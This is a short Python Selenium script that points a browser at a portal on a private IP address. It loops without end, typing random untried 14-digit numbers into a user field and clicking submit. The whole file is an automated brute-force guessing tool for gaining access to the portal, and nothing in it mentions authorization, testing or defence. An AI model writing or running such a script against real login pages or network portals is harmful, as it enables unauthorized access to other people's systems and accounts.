from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import random
##############################
brawser = webdriver.Chrome() #ChromeDriverManager().install()
brawser.get("http://10.8.80.1")

wrong_trys = []

while True:

    brawser.find_element_by_id("user").clear()

    user = random.randint(10000000000000 , 99999999999999)

    if user not in wrong_trys:

        wrong_trys.append(user)
        
        brawser.find_element_by_id("user").send_keys(f"{user}")

#        brawser.implicitly_wait(3)

        brawser.find_element_by_name("boton").click()
